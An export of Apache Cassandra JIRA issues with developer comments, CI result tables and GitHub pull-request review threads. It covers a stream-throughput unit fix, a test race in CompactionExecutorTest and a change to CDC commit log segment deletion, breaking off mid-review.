`inter_dc_stream_throughput_outbound_megabits_per_sec` were incorrectly interpreted as mebibits. This has
been fixed by CASSANDRA-17243, so the values for these properties will now indicate a throughput ~4.6% lower than
what was actually applied in previous versions. This also affects the setters and getters for these properties in
the JMX MBean `org.apache.cassandra.db:type=StorageService` and the nodetool commands `set/getstreamthroughput`
and `set/getinterdcstreamthroughput`.
{code}
We don't need to mention {{entire_sstable_stream_throughput_outbound_megabits_per_sec}} nor {{entire_sstable_inter_dc_stream_throughput_outbound_megabits_per_sec}} because they have been recently added to 4.1, and they don't exist on previous versions.
 ;;;","17/Jan/22 10:36;bereng;Wow, what a subtle catch. I agree we better keep things consistent and coherent despite the slight 5% change in bandwidth + News.txt. I have looked around, failures seem unrelated and mostly timeouts. +1;;;","25/Jan/22 19:09;adelapena;Here is a final round of CI after rebasing:
||PR||CI||
|[3.0|https://github.com/apache/cassandra/pull/1399]  |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1256/workflows/238c6f34-a350-415a-93ac-2de03b61f570]|
|[3.11|https://github.com/apache/cassandra/pull/1400] |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1255/workflows/067ad4ae-15fd-4d52-bd65-45774efe9efc]|
|[4.0|https://github.com/apache/cassandra/pull/1401]  |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1254/workflows/3f91621d-2ea7-4b7b-810e-ed61b72f31b8] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1254/workflows/f23e4f2b-cb61-4695-8b34-991a84172d45]|
|[trunk|https://github.com/apache/cassandra/pull/1402]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1257/workflows/e5000431-6b46-496d-bf4d-fe1a8d3aa46f] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1257/workflows/d70468a4-ec0f-45c8-873b-d5891df6784c]|;;;","26/Jan/22 05:55;bereng;Except a list index error on 3.0 the rest are unrelated timeouts or CASSANDRA-17265. LGTM happy to +1 again.;;;","26/Jan/22 11:54;adelapena;Thanks for the review.

Committed to 3.0 [40bf53359cae0805a978113a9e3156b168b48b14|https://github.com/apache/cassandra/commit/40bf53359cae0805a978113a9e3156b168b48b14] and merged up to [3.11|https://github.com/apache/cassandra/commit/bfab1fda882c368be0d2c9dad38cb5dbee501bfa], [4.0|https://github.com/apache/cassandra/commit/67f913a7064e7db83ae92f2c55eaeae7db51055c] and [trunk|https://github.com/apache/cassandra/commit/ecfe7e809baf342b33fae1d6497f32f90c2eda18].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race in CompactionExecutorTest,CASSANDRA-17239,13420939,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,05/Jan/22 23:39,16/Mar/22 08:54,13/Jul/23 08:40,06/Jan/22 21:46,3.0.26,3.11.12,4.0.2,,,,Test/unit,,,,0,,"CompactionExecutorTest has a race between the runnable/callable under test completing
and the {{afterExecute}} method stashing it for the test.  Replace the wait/sleep loop
with a {{SimpleCondition}} that is signaled once the test task throwable has been recorded.

This seems fairly hard to hit but has happened on CI.  It took about 2600 iterations on my MacBook to trigger, but you can artificially hit frequently by adding a sleep at the start of the afterExecute method.
",,jmckenzie,jonmeredith,,,,,,,,,,,,,"jonmeredith opened a new pull request #1377:
URL: https://github.com/apache/cassandra/pull/1377


   See [CASSANDRA-17239](https://issues.apache.org/jira/browse/CASSANDRA-17239)


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;06/Jan/22 00:31;githubbot;600","josh-mckenzie commented on a change in pull request #1377:
URL: https://github.com/apache/cassandra/pull/1377#discussion_r779638346



##########
File path: test/unit/org/apache/cassandra/db/compaction/CompactionExecutorTest.java
##########
@@ -63,44 +70,43 @@ public void destroy() throws Exception
         executor.awaitTermination(1, TimeUnit.MINUTES);
     }
 
+    void awaitExecution() throws Exception
+    {
+        assert afterExecuteCompleted.await(10, TimeUnit.SECONDS) : ""afterExecute failed to complete"";

Review comment:
       You inherited this from the initial implementation, but is there a reason we're only allowing for 10 seconds to execute before timing out? This seems like the kind of thing that could flake in adverse environments / scheduling / k8s silliness in the future.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;06/Jan/22 15:39;githubbot;600","jonmeredith commented on a change in pull request #1377:
URL: https://github.com/apache/cassandra/pull/1377#discussion_r779738259



##########
File path: test/unit/org/apache/cassandra/db/compaction/CompactionExecutorTest.java
##########
@@ -63,44 +70,43 @@ public void destroy() throws Exception
         executor.awaitTermination(1, TimeUnit.MINUTES);
     }
 
+    void awaitExecution() throws Exception
+    {
+        assert afterExecuteCompleted.await(10, TimeUnit.SECONDS) : ""afterExecute failed to complete"";

Review comment:
       Happy to bump it up to a minute - the original test doesn't have a timeout as far as I can tell - it's just sleeping 10 milliseconds between checks on the future. 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;06/Jan/22 17:43;githubbot;600","josh-mckenzie commented on a change in pull request #1377:
URL: https://github.com/apache/cassandra/pull/1377#discussion_r779775822



##########
File path: test/unit/org/apache/cassandra/db/compaction/CompactionExecutorTest.java
##########
@@ -63,44 +70,43 @@ public void destroy() throws Exception
         executor.awaitTermination(1, TimeUnit.MINUTES);
     }
 
+    void awaitExecution() throws Exception
+    {
+        assert afterExecuteCompleted.await(10, TimeUnit.SECONDS) : ""afterExecute failed to complete"";

Review comment:
       You're absolutely right. I was thinking it was sleeping 10 seconds and that's why you moved to a 10 second timeout on the signal wait; totally spaced that sleep's ms. 👍 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;06/Jan/22 18:44;githubbot;600","smiklosovic closed pull request #1377:
URL: https://github.com/apache/cassandra/pull/1377


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:54;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3000,,,0,3000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jan 06 21:29:22 UTC 2022,,,,,,,All,,,,"0|z0yag8:",9223372036854775807,,,,jmckenzie,,,,Low,,2.2.11,,https://github.com/apache/cassandra/commit/7f2c0d7e5f896fa1e466c9e7c1dbf9db9157eea8,,,,,,,,,Run unit test - a lot.,,,,,"06/Jan/22 00:33;jonmeredith;Only affects 3.0/3.11/4.0. The changes made to the test for the simulator solve the issue by using the {{UncaughtExceptionHandler}}

[3.0 PR|https://github.com/apache/cassandra/pull/1377] 

[3.0 branch|https://github.com/jonmeredith/cassandra/tree/C-17239-3.0]
[3.11 branch (minor difference for test setup|https://github.com/jonmeredith/cassandra/tree/C-17239-3.11)]
[4.0 branch (similar to 3.11)|https://github.com/jonmeredith/cassandra/tree/C-17239-4.0];;;","06/Jan/22 15:44;jmckenzie;+1. Had a question about whether inheriting the 10 second timeout w/out revising it makes sense from a ""brittleness and future containerized test execution environments will make us sad"" perspective but still; this should fix it.;;;","06/Jan/22 18:20;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17239-cassandra-3.0-3F4CD5B8-B00A-4F97-B022-85FA3FED27A1]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17239-cassandra-3.0-3F4CD5B8-B00A-4F97-B022-85FA3FED27A1]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1350/]|
|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17239-cassandra-3.11-3F4CD5B8-B00A-4F97-B022-85FA3FED27A1]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17239-cassandra-3.11-3F4CD5B8-B00A-4F97-B022-85FA3FED27A1]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1351/]|
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17239-cassandra-4.0-3F4CD5B8-B00A-4F97-B022-85FA3FED27A1]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17239-cassandra-4.0-3F4CD5B8-B00A-4F97-B022-85FA3FED27A1]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1352/]|

(no change to trunk, will add the merge commit to resolve).;;;","06/Jan/22 21:29;jonmeredith;Test failures unrelated to CompactionExecutorTest - going ahead with merge;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix   org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testNonblockingShouldMaintainSteadyDiskUsage,CASSANDRA-17233,13420474,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,yifanc,e.dimitrova,e.dimitrova,03/Jan/22 22:00,07/Mar/23 11:52,13/Jul/23 08:40,17/Feb/22 06:57,4.1,4.1-alpha1,,,,,CI,,,,0,,"Fails consistently on trunk:

https://ci-cassandra.apache.org/job/Cassandra-trunk/893/testReport/junit/org.apache.cassandra.db.commitlog/CommitLogSegmentManagerCDCTest/testNonblockingShouldMaintainSteadyDiskUsage/history/",,e.dimitrova,jmckenzie,n.v.harikrishna,yifanc,,,,,,,,,,,"josh-mckenzie commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r785045772



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes
      */
-    public long deleteOldestLinkedCDCCommitLogSegment()
+    public long deleteOldLinkedCDCCommitLogSegment(long bytesToFree)
     {
+        if (bytesToFree <= 0)
+            return 0;
+
         File cdcDir = new File(DatabaseDescriptor.getCDCLogLocation());
         Preconditions.checkState(cdcDir.isDirectory(), ""The CDC directory does not exist."");
         File[] files = cdcDir.tryList(f -> CommitLogDescriptor.isValid(f.name()));
-        Preconditions.checkState(files != null && files.length > 0,
-                                 ""There should be at least 1 CDC commit log segment."");
+        if (files == null || files.length == 0)
+        {
+            logger.warn(""Skip deleting due to no CDC commit log segments found."");
+            return 0;
+        }
         List<File> sorted = Arrays.stream(files)
-                                  .sorted(Comparator.comparingLong(File::lastModified))
+                                  // commit log file name (contains id) increases monotonically

Review comment:
       While true today, I'm a little concerned about this undocumented (effectively; has a comment here but nothing to indicate dependency on other side) coupling. Could we formalize or comment in the CommitLogSegment naming / generation that we depend on that functionality here and {@link X} in the JavaDoc to tie them together for future maintainers?

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes
      */
-    public long deleteOldestLinkedCDCCommitLogSegment()
+    public long deleteOldLinkedCDCCommitLogSegment(long bytesToFree)
     {
+        if (bytesToFree <= 0)
+            return 0;
+
         File cdcDir = new File(DatabaseDescriptor.getCDCLogLocation());
         Preconditions.checkState(cdcDir.isDirectory(), ""The CDC directory does not exist."");
         File[] files = cdcDir.tryList(f -> CommitLogDescriptor.isValid(f.name()));
-        Preconditions.checkState(files != null && files.length > 0,
-                                 ""There should be at least 1 CDC commit log segment."");
+        if (files == null || files.length == 0)
+        {
+            logger.warn(""Skip deleting due to no CDC commit log segments found."");
+            return 0;
+        }
         List<File> sorted = Arrays.stream(files)
-                                  .sorted(Comparator.comparingLong(File::lastModified))
+                                  // commit log file name (contains id) increases monotonically
+                                  .sorted(Comparator.comparing(File::name))
                                   .collect(Collectors.toList());
-        File oldestCdcFile = sorted.get(0);
-        File cdcIndexFile = CommitLogDescriptor.inferCdcIndexFile(oldestCdcFile);
-        return deleteCDCFiles(oldestCdcFile, cdcIndexFile);
+        long bytesDeleted = 0;
+        long bytesRemaining = 0;
+        boolean deletionCompleted = false;
+        // keep deleting from old to new until it reaches to the goal or the current writting segment

Review comment:
       nit: writing

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -158,6 +185,16 @@ public void shutdown()
         return alloc;
     }
 
+    // Non-blocking mode is just enabled for CDC. The segment is still marked as FORBIDDEN.

Review comment:
       nit: rephrase to ""Non-blocking mode has just recently been enabled for CDC"" if that's the intent here. Reads like it's ""only"" set for CDC which is a little confusing.

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes
      */
-    public long deleteOldestLinkedCDCCommitLogSegment()
+    public long deleteOldLinkedCDCCommitLogSegment(long bytesToFree)
     {
+        if (bytesToFree <= 0)
+            return 0;
+
         File cdcDir = new File(DatabaseDescriptor.getCDCLogLocation());
         Preconditions.checkState(cdcDir.isDirectory(), ""The CDC directory does not exist."");
         File[] files = cdcDir.tryList(f -> CommitLogDescriptor.isValid(f.name()));
-        Preconditions.checkState(files != null && files.length > 0,
-                                 ""There should be at least 1 CDC commit log segment."");
+        if (files == null || files.length == 0)
+        {
+            logger.warn(""Skip deleting due to no CDC commit log segments found."");
+            return 0;
+        }
         List<File> sorted = Arrays.stream(files)
-                                  .sorted(Comparator.comparingLong(File::lastModified))
+                                  // commit log file name (contains id) increases monotonically
+                                  .sorted(Comparator.comparing(File::name))
                                   .collect(Collectors.toList());
-        File oldestCdcFile = sorted.get(0);
-        File cdcIndexFile = CommitLogDescriptor.inferCdcIndexFile(oldestCdcFile);
-        return deleteCDCFiles(oldestCdcFile, cdcIndexFile);
+        long bytesDeleted = 0;
+        long bytesRemaining = 0;
+        boolean deletionCompleted = false;
+        // keep deleting from old to new until it reaches to the goal or the current writting segment
+        for (File linkedCdcFile : sorted)
+        {
+            // only evaluate/update when deletionCompleted is false
+            deletionCompleted = deletionCompleted
+                                || (bytesDeleted >= bytesToFree || linkedCdcFile.equals(allocatingFrom().getCDCFile()));

Review comment:
       I found this conditional a little convoluted to parse. Maybe we do something like:
    ```
              // only evaluate/update when deletionCompleted is false
               if (!deletionCompleted)
                   deletionCompleted = bytesDeleted > bytesToFree || linkedCdcFile.equals(allocatingFrom().getCDCFile());
   ```

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes

Review comment:
       I think we either need to amend this javadoc @return to match that we're returning the bytes remaining or we need to juggle around variable names below. Currently this seems incorrect.
   
   It looks like we're expecting CDC bytes remaining in CommitLogSegmentManagerCDC.processNewSegment, so I think this is probably just a vestigial javadoc entry.

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -295,18 +334,23 @@ void processNewSegment(CommitLogSegment segment)
 
         void processDiscardedSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            if (!segment.getCDCFile().exists())
+            {
+                logger.debug(""Skip updating size. The CDC commit log segement has been deleted already."");

Review comment:
       Recommend revise this to something like ""Not processing discarded CommitLogSegment {}; this segment appears to have been deleted already."", segment)

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -264,29 +301,31 @@ public void start()
          */
         void processNewSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            int segmentSize = defaultSegmentSize();
+            long allowance = allowableCDCBytes();
+            boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
+
+            synchronized (segment.cdcStateLock)
             {
-                int segmentSize = defaultSegmentSize();
-                long allowance = allowableCDCBytes();
-                boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
                 segment.setCDCState(blocking && segmentSize + sizeInProgress.get() > allowance
                                     ? CDCState.FORBIDDEN
                                     : CDCState.PERMITTED);
 
-                // Remove the oldest cdc segment file when exceeding the CDC storage allowance
-                while (!blocking && segmentSize + sizeInProgress.get() > allowance)
-                {
-                    long releasedSize = segmentManager.deleteOldestLinkedCDCCommitLogSegment();
-                    sizeInProgress.getAndAdd(-releasedSize);
-                    logger.debug(""Freed up {} bytes after deleting the oldest CDC commit log segment in non-blocking mode. "" +
-                                 ""Total on-disk CDC size: {}; allowed CDC size: {}"",
-                                 releasedSize, sizeInProgress.get() + segmentSize, allowance);
-                }
-
                 // Aggresively count in the (estimated) size of new segments.
                 if (segment.getCDCState() == CDCState.PERMITTED)
-                    sizeInProgress.getAndAdd(segmentSize);
+                    addSize(segmentSize);
+            }
+
+            // Remove the oldest cdc segment file when exceeding the CDC storage allowance
+            if (!blocking && sizeInProgress.get() > allowance)
+            {
+                long bytesToFree = sizeInProgress.get() - allowance;
+                long remaningSize = segmentManager.deleteOldLinkedCDCCommitLogSegment(bytesToFree);
+                long releasedSize = sizeInProgress.get() - remaningSize;
+                sizeInProgress.getAndSet(remaningSize);
+                logger.debug(""Freed up {} ({}) bytes after deleting the oldest CDC commit log segments in non-blocking mode. "" +
+                             ""Total on-disk CDC size: {}; allowed CDC size: {}"",

Review comment:
       Should we be passing `remainingSize` as the string param for our ""Total on-disk CDC size:""? Passing bytesToFree will be listing the sizeInProgress - allowance which _seems_ off?

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -264,29 +301,31 @@ public void start()
          */
         void processNewSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            int segmentSize = defaultSegmentSize();
+            long allowance = allowableCDCBytes();
+            boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
+
+            synchronized (segment.cdcStateLock)
             {
-                int segmentSize = defaultSegmentSize();
-                long allowance = allowableCDCBytes();
-                boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
                 segment.setCDCState(blocking && segmentSize + sizeInProgress.get() > allowance
                                     ? CDCState.FORBIDDEN
                                     : CDCState.PERMITTED);
 
-                // Remove the oldest cdc segment file when exceeding the CDC storage allowance
-                while (!blocking && segmentSize + sizeInProgress.get() > allowance)
-                {
-                    long releasedSize = segmentManager.deleteOldestLinkedCDCCommitLogSegment();
-                    sizeInProgress.getAndAdd(-releasedSize);
-                    logger.debug(""Freed up {} bytes after deleting the oldest CDC commit log segment in non-blocking mode. "" +
-                                 ""Total on-disk CDC size: {}; allowed CDC size: {}"",
-                                 releasedSize, sizeInProgress.get() + segmentSize, allowance);
-                }
-
                 // Aggresively count in the (estimated) size of new segments.

Review comment:
       nit: Spelling. Should be ""Aggressively"" (that's on me 😄 )

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -264,29 +301,31 @@ public void start()
          */
         void processNewSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            int segmentSize = defaultSegmentSize();
+            long allowance = allowableCDCBytes();
+            boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
+
+            synchronized (segment.cdcStateLock)
             {
-                int segmentSize = defaultSegmentSize();
-                long allowance = allowableCDCBytes();
-                boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
                 segment.setCDCState(blocking && segmentSize + sizeInProgress.get() > allowance
                                     ? CDCState.FORBIDDEN
                                     : CDCState.PERMITTED);
 
-                // Remove the oldest cdc segment file when exceeding the CDC storage allowance

Review comment:
       Keep this bread crumb so people know where the other side of this synchronization is if they come back to modify later.

##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -264,29 +301,31 @@ public void start()
          */
         void processNewSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            int segmentSize = defaultSegmentSize();
+            long allowance = allowableCDCBytes();
+            boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
+
+            synchronized (segment.cdcStateLock)
             {
-                int segmentSize = defaultSegmentSize();
-                long allowance = allowableCDCBytes();
-                boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
                 segment.setCDCState(blocking && segmentSize + sizeInProgress.get() > allowance
                                     ? CDCState.FORBIDDEN
                                     : CDCState.PERMITTED);
 
-                // Remove the oldest cdc segment file when exceeding the CDC storage allowance
-                while (!blocking && segmentSize + sizeInProgress.get() > allowance)
-                {
-                    long releasedSize = segmentManager.deleteOldestLinkedCDCCommitLogSegment();
-                    sizeInProgress.getAndAdd(-releasedSize);
-                    logger.debug(""Freed up {} bytes after deleting the oldest CDC commit log segment in non-blocking mode. "" +
-                                 ""Total on-disk CDC size: {}; allowed CDC size: {}"",
-                                 releasedSize, sizeInProgress.get() + segmentSize, allowance);
-                }
-
                 // Aggresively count in the (estimated) size of new segments.
                 if (segment.getCDCState() == CDCState.PERMITTED)
-                    sizeInProgress.getAndAdd(segmentSize);
+                    addSize(segmentSize);
+            }
+
+            // Remove the oldest cdc segment file when exceeding the CDC storage allowance
+            if (!blocking && sizeInProgress.get() > allowance)
+            {
+                long bytesToFree = sizeInProgress.get() - allowance;
+                long remaningSize = segmentManager.deleteOldLinkedCDCCommitLogSegment(bytesToFree);

Review comment:
       nit: spelling. `remainingSize`




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;14/Jan/22 18:33;githubbot;600","yifan-c commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r786422090



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes
      */
-    public long deleteOldestLinkedCDCCommitLogSegment()
+    public long deleteOldLinkedCDCCommitLogSegment(long bytesToFree)
     {
+        if (bytesToFree <= 0)
+            return 0;
+
         File cdcDir = new File(DatabaseDescriptor.getCDCLogLocation());
         Preconditions.checkState(cdcDir.isDirectory(), ""The CDC directory does not exist."");
         File[] files = cdcDir.tryList(f -> CommitLogDescriptor.isValid(f.name()));
-        Preconditions.checkState(files != null && files.length > 0,
-                                 ""There should be at least 1 CDC commit log segment."");
+        if (files == null || files.length == 0)
+        {
+            logger.warn(""Skip deleting due to no CDC commit log segments found."");
+            return 0;
+        }
         List<File> sorted = Arrays.stream(files)
-                                  .sorted(Comparator.comparingLong(File::lastModified))
+                                  // commit log file name (contains id) increases monotonically

Review comment:
       Agree. I hesitated between comparing the file name and the `id` value before pushing the commit. 
   Here, it only depends on the `id` field to sort. I will update the comparator to use id, so it is explicit. 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Jan/22 05:18;githubbot;600","yifan-c commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r786426457



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes
      */
-    public long deleteOldestLinkedCDCCommitLogSegment()
+    public long deleteOldLinkedCDCCommitLogSegment(long bytesToFree)
     {
+        if (bytesToFree <= 0)
+            return 0;
+
         File cdcDir = new File(DatabaseDescriptor.getCDCLogLocation());
         Preconditions.checkState(cdcDir.isDirectory(), ""The CDC directory does not exist."");
         File[] files = cdcDir.tryList(f -> CommitLogDescriptor.isValid(f.name()));
-        Preconditions.checkState(files != null && files.length > 0,
-                                 ""There should be at least 1 CDC commit log segment."");
+        if (files == null || files.length == 0)
+        {
+            logger.warn(""Skip deleting due to no CDC commit log segments found."");
+            return 0;
+        }
         List<File> sorted = Arrays.stream(files)
-                                  .sorted(Comparator.comparingLong(File::lastModified))
+                                  // commit log file name (contains id) increases monotonically
+                                  .sorted(Comparator.comparing(File::name))
                                   .collect(Collectors.toList());
-        File oldestCdcFile = sorted.get(0);
-        File cdcIndexFile = CommitLogDescriptor.inferCdcIndexFile(oldestCdcFile);
-        return deleteCDCFiles(oldestCdcFile, cdcIndexFile);
+        long bytesDeleted = 0;
+        long bytesRemaining = 0;
+        boolean deletionCompleted = false;
+        // keep deleting from old to new until it reaches to the goal or the current writting segment
+        for (File linkedCdcFile : sorted)
+        {
+            // only evaluate/update when deletionCompleted is false
+            deletionCompleted = deletionCompleted
+                                || (bytesDeleted >= bytesToFree || linkedCdcFile.equals(allocatingFrom().getCDCFile()));

Review comment:
       Yep. It does not worth it to trade readability with compactness.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Jan/22 05:32;githubbot;600","yifan-c commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r786429599



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -264,29 +301,31 @@ public void start()
          */
         void processNewSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            int segmentSize = defaultSegmentSize();
+            long allowance = allowableCDCBytes();
+            boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
+
+            synchronized (segment.cdcStateLock)
             {
-                int segmentSize = defaultSegmentSize();
-                long allowance = allowableCDCBytes();
-                boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
                 segment.setCDCState(blocking && segmentSize + sizeInProgress.get() > allowance
                                     ? CDCState.FORBIDDEN
                                     : CDCState.PERMITTED);
 
-                // Remove the oldest cdc segment file when exceeding the CDC storage allowance

Review comment:
       Do you mean this comment line?
   ```
   // See synchronization in CommitLogSegment.setCDCState```




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Jan/22 05:41;githubbot;600","yifan-c commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r786431467



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -264,29 +301,31 @@ public void start()
          */
         void processNewSegment(CommitLogSegment segment)
         {
-            // See synchronization in CommitLogSegment.setCDCState
-            synchronized(segment.cdcStateLock)
+            int segmentSize = defaultSegmentSize();
+            long allowance = allowableCDCBytes();
+            boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
+
+            synchronized (segment.cdcStateLock)
             {
-                int segmentSize = defaultSegmentSize();
-                long allowance = allowableCDCBytes();
-                boolean blocking = DatabaseDescriptor.getCDCBlockWrites();
